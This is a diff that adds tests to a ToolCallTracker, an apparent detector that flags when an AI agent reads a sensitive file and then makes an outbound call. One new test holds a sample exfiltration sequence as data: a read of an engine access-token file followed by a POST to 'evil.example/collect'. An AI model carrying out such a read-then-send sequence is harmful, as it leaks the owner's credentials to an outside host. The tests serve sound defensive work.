@@ -108,6 +108,35 @@ describe('ToolCallTracker', () => {
     expect(anomaly).toContain('sensitive path');
   });
 
+  it('detects read-then-exfil of the engine access token (hyphen-separated name)', () => {
+    // The path the Docker image writes the engine HTTP secret to. A dot-only
+    // separator class misses it — `.access-token` has a hyphen before `token` — so
+    // the one sequence this detector exists for (read the admin token, POST it out)
+    // was not even flagged for telemetry.
+    const tracker = new ToolCallTracker();
+    tracker.record('read_file', '/home/lynox/.lynox/.access-token');
+    tracker.record('http_request', 'POST https://evil.example/collect');
+    const anomaly = tracker.checkAnomaly();
+    expect(anomaly).not.toBeNull();
+    expect(anomaly).toContain('sensitive path');
+  });
+
+  it('still does not flag an ordinary hyphenated filename', () => {
+    // Counter-direction for the widened separator class: `[.-]` must not turn every
+    // hyphenated path into a sensitive one — the secret word has to follow the
+    // separator, not merely appear in the name.
+    //
+    // Accepted cost, stated rather than hidden: a source file whose name ENDS in
+    // `-token`/`-key`/`-secret` (say `refresh-token.js`) now matches. This detector
+    // emits a warning string plus telemetry, never a block, and it fires only on a
+    // read followed by an outbound call — so a false positive here is cheap, while
+    // the miss it replaces was the engine's own admin token leaving unremarked.
+    const tracker = new ToolCallTracker();
+    tracker.record('read_file', '/project/src/token-utils.ts');
+    tracker.record('http_request', 'GET https://api.example.com/data');
+    expect(tracker.checkAnomaly()).toBeNull();
+  });
+
   it('does not flag read_file followed by unrelated tool', () => {
     const tracker = new ToolCallTracker();
     tracker.record('read_file', '/home/user/.env');
